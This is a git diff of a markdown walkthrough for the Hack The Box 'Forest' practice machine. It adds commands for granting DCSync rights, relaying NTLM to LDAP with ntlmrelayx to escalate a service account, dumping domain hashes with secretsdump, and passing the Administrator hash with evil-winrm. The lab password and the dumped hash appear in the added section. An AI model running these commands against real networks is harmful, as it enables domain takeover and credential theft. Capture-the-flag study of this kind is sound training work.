@@ -45,7 +45,7 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSy
 [+] Success!
 ```
 
-##### Life saver ntlmrelayx.py since none of them working
+### Life saver ntlmrelayx.py since none of them working
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco
 
@@ -53,3 +53,13 @@ python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --e
 ```
 Although, i did run it twice to make it work
 https://rootinjail.com/blog/post/htb-forest/
+
+### Root
+```bash
+impacket-secretsdump -just-dc svc-alfresco:s3rvice@10.129.232.105
+
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP
+```
